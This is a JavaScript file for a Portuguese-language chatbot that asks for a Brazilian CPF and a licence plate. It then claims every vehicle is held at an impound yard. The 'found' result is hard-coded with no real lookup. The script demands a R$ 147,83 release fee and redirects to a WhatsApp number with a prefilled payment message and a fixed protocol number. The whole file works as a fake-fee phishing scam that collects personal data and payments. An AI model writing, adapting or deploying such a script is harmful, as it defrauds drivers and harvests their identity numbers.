const cpfInput = document.querySelector("[data-cpf-input]");
const cpfSubmit = document.querySelector("[data-cpf-submit]");
const consultaChat = document.querySelector(".consulta-chat");

if (cpfInput && cpfSubmit && consultaChat) {
  const avatarImage = "./img/avatar.jpg";
  let currentStep = "cpf";
  let plateValue = "";
  let typingIndicator = null;
  let isSubmitting = false;

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  const scrollChatToBottom = () => {
    requestAnimationFrame(() => {
      window.scrollTo({
        top: document.body.scrollHeight,
        behavior: "smooth",
      });
    });
  };

  const sanitizeCpf = (value) => value.replace(/\D/g, "").slice(0, 11);

  const formatCpf = (value) => {
    const digits = sanitizeCpf(value);
    return digits
      .replace(/^(\d{3})(\d)/, "$1.$2")
      .replace(/^(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
      .replace(/\.(\d{3})(\d)/, ".$1-$2");
  };

  const normalizePlate = (value) => value.replace(/[^a-zA-Z0-9]/g, "").toUpperCase().slice(0, 7);

  const isValidVehiclePlate = (plate) => {
    const oldPlatePattern = /^[A-Z]{3}\d{4}$/;
    const mercosulPlatePattern = /^[A-Z]{3}\d[A-Z]\d{2}$/;
    return oldPlatePattern.test(plate) || mercosulPlatePattern.test(plate);
  };

  const appendBotMessage = (text) => {
    const message = document.createElement("article");
    message.className = "consulta-message is-bot";
    message.innerHTML = `
      <img src="${avatarImage}" alt="Bot avatar" class="consulta-avatar">
      <div class="consulta-bubble consulta-bubble--text">${text}</div>
    `;
    consultaChat.appendChild(message);
    scrollChatToBottom();
  };

  const appendUserMessage = (text) => {
    const message = document.createElement("article");
    message.className = "consulta-message is-user";
    message.innerHTML = `<div class="consulta-bubble consulta-bubble--text">${text}</div>`;
    consultaChat.appendChild(message);
    scrollChatToBottom();
  };

  const disableQuickReplies = () => {
    const allButtons = consultaChat.querySelectorAll("[data-quick-reply]");
    allButtons.forEach((button) => {
      button.disabled = true;
      button.classList.add("is-disabled");
    });
  };

  const appendQuickReplies = (options, onSelect) => {
    const wrapper = document.createElement("article");
    wrapper.className = "consulta-message is-bot";

    const choices = options
      .map((option) => {
        let variant = "consulta-quick-reply--neutral";
        if (option === "Sim") variant = "consulta-quick-reply--sim";
        if (option === "Não") variant = "consulta-quick-reply--nao";
        return `<button type="button" class="consulta-quick-reply ${variant}" data-quick-reply="${option}">${option}</button>`;
      })
      .join("");

    wrapper.innerHTML = `
      <img src="${avatarImage}" alt="Bot avatar" class="consulta-avatar">
      <div class="consulta-bubble consulta-bubble--text">
        <div class="consulta-quick-replies">${choices}</div>
      </div>
    `;
    consultaChat.appendChild(wrapper);
    scrollChatToBottom();

    wrapper.querySelectorAll("[data-quick-reply]").forEach((button) => {
      button.addEventListener("click", () => {
        disableQuickReplies();
        const selected = button.getAttribute("data-quick-reply") ?? "";
        appendUserMessage(selected);
        onSelect(selected);
      });
    });
  };

  const showTypingIndicator = () => {
    if (typingIndicator) return;
    typingIndicator = document.createElement("article");
    typingIndicator.className = "consulta-message is-bot is-typing";
    typingIndicator.innerHTML = `
      <img src="${avatarImage}" alt="Bot avatar" class="consulta-avatar">
      <div class="consulta-bubble consulta-bubble--text consulta-typing">
        <span></span><span></span><span></span>
      </div>
    `;
    consultaChat.appendChild(typingIndicator);
    scrollChatToBottom();
  };

  const hideTypingIndicator = () => {
    if (!typingIndicator) return;
    typingIndicator.remove();
    typingIndicator = null;
  };

  const sendBotMessageWithTyping = async (text, delay = 1200) => {
    showTypingIndicator();
    await sleep(delay);
    hideTypingIndicator();
    appendBotMessage(text);
  };

  const configureForPlate = () => {
    cpfInput.placeholder = "Insira a placa do veículo...";
    cpfInput.maxLength = 7;
    cpfInput.disabled = false;
    cpfSubmit.disabled = false;
    cpfInput.focus();
  };

  const configureForCpf = () => {
    cpfInput.placeholder = "Insira seu CPF...";
    cpfInput.maxLength = 14;
    cpfInput.disabled = false;
    cpfSubmit.disabled = false;
    cpfInput.focus();
  };

  const configureForQuickReply = () => {
    cpfInput.value = "";
    cpfInput.disabled = true;
    cpfSubmit.disabled = true;
  };

  const flowAfterVehicleFound = async () => {
    await sendBotMessageWithTyping(
      `Veículo com a Placa: <strong>${plateValue}</strong>. Encontrado com sucesso em nosso sistema.`,
      1500
    );
    await sendBotMessageWithTyping("Deseja solicitar Liberação?", 900);
    currentStep = "ask_release";
    configureForQuickReply();
    appendQuickReplies(["Sim", "Não"], async (answer) => {
      if (answer === "Não") {
        await sendBotMessageWithTyping(
          "Tudo bem. Se precisar, você pode retomar a solicitação quando quiser.",
          900
        );
        return;
      }

      currentStep = "release_success";
      await sendBotMessageWithTyping("✅ <strong>Sucesso!</strong>", 900);
      await sendBotMessageWithTyping(
        `⚠️ <strong>Atenção! Veículo PLACA: ${plateValue},</strong> encontra-se com taxa de <strong>Oficio de Liberação</strong> Pendente.`,
        1200
      );
      await sendBotMessageWithTyping(
        "O <strong>ofício de liberação</strong> de veículo é o <strong>documento</strong> que indica o pátio e autoriza o proprietário a retirar seu veículo.<br>" +
          "<strong>O documento é emitido totalmente online, não sendo possível remoção do veículo do pátio sem ofício em mãos.</strong>",
        1200
      );
      await sendBotMessageWithTyping(
        "<strong>Para liberar o veículo, é necessário:</strong><br><br>" +
          "1️⃣ - <strong>Pagar Guia Liberação de ofício</strong> no valor: <strong>R$ 147,83</strong><br><br>" +
          "2️⃣ - Após o pagamento será enviado o <strong>Guia de Ofício de liberação</strong> no <strong>e-mail indicado no momento do pagamento.</strong><br><br>" +
          "3️⃣ - <strong>Seguir Passo a Passo indicado</strong> no <strong>Guia de liberação</strong> enviado no <strong>e-mail indicado no momento do pagamento.</strong><br><br>" +
          "4️⃣ - Após emissão, apresentar <strong>Ofício de liberação</strong> juntamente com documento de <strong>identificação pessoal</strong> (CNH, RG, Passaporte) ou <strong>procuração legal do proprietário.</strong>",
        1300
      );
      await sendBotMessageWithTyping(
        "<strong>DESEJA REALIZAR A LIBERAÇÃO AGORA?</strong>",
        900
      );
      currentStep = "final_decision";
      appendQuickReplies(["Sim", "Não"], async (finalAnswer) => {
        if (finalAnswer === "Sim") {
          const whatsappMessage =
            "Olá, Já enviei meus documentos, e gostaria de *Realizar o Pagamento da Guia de Liberação* " +
            "no valor de *R$ 147,83*, Referente a Liberação do Veículo Protocolo: *2026841285*";
          const whatsappNumber = "5511951706840";
          const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(whatsappMessage)}`;
          window.location.href = whatsappUrl;
          return;
        }

        await sendBotMessageWithTyping(
          "Sem problemas. Quando quiser, retorne para continuar sua liberação.",
          900
        );
      });
    });
  };

  const handleSubmit = async () => {
    if (isSubmitting || cpfInput.disabled) return;
    const userText = cpfInput.value.trim();
    if (!userText) return;

    isSubmitting = true;
    cpfSubmit.disabled = true;
    appendUserMessage(userText);

    try {
      if (currentStep === "cpf") {
        const rawCpf = sanitizeCpf(userText);
        cpfInput.value = "";

        if (rawCpf.length < 10) {
          await sendBotMessageWithTyping("Informe um CPF válido com números suficientes.", 900);
          return;
        }

        await sendBotMessageWithTyping("Seja Bem Vindo(a) ao nosso atendimento!", 1000);
        await sendBotMessageWithTyping(
          "🟢 Informe a <strong>placa do veículo</strong> (sem espaços ou traços; use letras maiúsculas e números).<br><br>Ex.: <strong>ABC1234</strong> ou <strong>ABC1D23</strong>.",
          1000
        );
        currentStep = "plate";
        configureForPlate();
        return;
      }

      if (currentStep === "plate") {
        const normalized = normalizePlate(userText);
        cpfInput.value = "";

        if (!isValidVehiclePlate(normalized)) {
          await sendBotMessageWithTyping(
            "Placa inválida. Use o formato antigo (AAA1234) ou Mercosul (AAA1A23).",
            900
          );
          return;
        }

        plateValue = normalized;
        await sendBotMessageWithTyping(
          `🟢 <strong>Confirmar busca para a placa:</strong> ${plateValue} ❔`,
          900
        );
        currentStep = "confirm_plate";
        configureForQuickReply();
        appendQuickReplies(["Sim", "Não"], async (answer) => {
          if (answer === "Não") {
            await sendBotMessageWithTyping(
              "Sem problemas. Informe novamente a placa do veículo para nova consulta.",
              900
            );
            currentStep = "plate";
            configureForPlate();
            return;
          }
          await sendBotMessageWithTyping("verificando dados informados...", 1200);
          await flowAfterVehicleFound();
        });
        return;
      }
    } finally {
      isSubmitting = false;
      if (!cpfInput.disabled) {
        cpfSubmit.disabled = false;
      }
    }
  };

  cpfInput.addEventListener("input", () => {
    if (currentStep === "cpf") {
      cpfInput.value = formatCpf(cpfInput.value);
      return;
    }
    if (currentStep === "plate") {
      cpfInput.value = normalizePlate(cpfInput.value);
    }
  });

  cpfInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      handleSubmit();
    }
  });

  cpfSubmit.addEventListener("click", handleSubmit);
  configureForCpf();
}
